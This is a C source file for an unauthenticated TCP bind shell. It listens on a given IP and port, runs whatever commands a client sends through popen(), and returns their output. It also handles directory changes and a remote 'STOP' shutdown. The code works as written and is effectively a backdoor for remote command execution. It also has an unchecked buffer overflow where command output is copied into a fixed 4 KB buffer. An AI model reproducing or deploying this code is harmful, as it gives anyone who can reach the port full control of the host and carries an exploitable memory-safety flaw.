#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h> // translate char* to ip
#include <unistd.h> // write(), read(), ...
#define MAX 4048 // 4kb buffer
#define SA struct sockaddr

// execute given command
// return the bytes read from stdout
ssize_t execute(char* buff, ssize_t len) {
	// copy the buff into the command buffer
	char cmd[len+1];
	strncpy(cmd, buff, len);
	cmd[len] = '\0';

	// allow to change the process directory
	if(strncmp(cmd, "cd", 2) == 0) {
		char *path = cmd+3; // cmd+3 => skip this ['c', 'd', ' ']
		if(chdir(path)!=0) {
			return snprintf(buff, MAX, "couldn't change directory\n");
		}
		return snprintf(buff, MAX, "changed dir with success\n");
	}

	// open a pipe running the command
	FILE* fp = popen(cmd, "r");
	if (fp == NULL) {
		return 1;
	}

	// count how many char is read
	ssize_t counter = 0;

	// send command stdout to the socket
	int c;
	while((c = fgetc(fp))!=EOF) {
		buff[counter] = c;
		counter += 1;
	}

	// TODO check the return code
	int status = pclose(fp);

	// return how many bytes read
	return counter;
}

// Function designed for chat between client and server.
int handle(int connfd) {
    char buff[MAX];
	ssize_t bytes;
    // infinite loop for chat
    for (;;) {
        // read the message from client and copy it in buffer
		bytes = read(connfd, buff, sizeof(buff));
		if(bytes == 0) {
			printf("client left the conn\n");
			close(connfd);
			return 0;
		}

        // if buff equals exit then close the conn
        if (strncmp("exit", buff, 4) == 0) {
			printf("client left the conn\n");
			close(connfd);
            return 0;
        }

		// if buff equals STOP then close the conn
        if (strncmp("STOP", buff, 4) == 0) {
			printf("client left the conn\n");
			close(connfd);
            return 1;
        }
        // print buffer which contains the client contents
		printf("%.*s\n", (int)bytes, buff);

		// execute the command in buff
		// send the output to connfd
		bytes = execute(buff, bytes);
		write(connfd, buff, bytes);
		if(bytes == 0) { // 0 as return so command not executed
			write(connfd, "command not found\n", 18);
		}
    }
	return 0;
}
   
int main(int argc, char **argv){
	// check arguments
	if(argc != 3) {
		printf("Usage: %s [ip] [port]\n", argv[0]);
		return 1;
	}

	// declare needed variables
    int sockfd, connfd;
	unsigned int len;
    struct sockaddr_in servaddr, cli;
   
    // create the socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
    	return 1;
    }
   
	// set option to socket to be able to reuse it quickly after its close
	int flag = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof flag);

    // assign IP, PORT
    servaddr.sin_family = AF_INET; // ipv4
	const unsigned long ip = inet_addr(argv[1]);
	if (ip == INADDR_NONE) {
		printf("%s: wrong format ipv4\n", argv[1]);
		return 4;
	}
    servaddr.sin_addr.s_addr = ip; // all interfaces/addresses
    servaddr.sin_port = htons(atoi(argv[2])); // port
   
    // bind the socket
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
        printf("socket bind failed...\n");
        return 2;
    }
   
    // start listening
    if ((listen(sockfd, 5)) != 0) {
        printf("Listen failed...\n");
        return 3;
    }
    printf("Server listening..\n");
   
	// loop accepting client
    len = sizeof(cli);
	while((connfd = accept(sockfd, (SA*)&cli, &len))) {
		// if accepting fail, just wait for another client
		if (connfd < 0) {
			perror("");
			continue;
		}
		printf("got a client !\n");

		// handle client
		// 0 => not shut down
		// 1 => shut down
		if(handle(connfd)){break;}
	}
   
    // close the server socket
    close(sockfd);
}
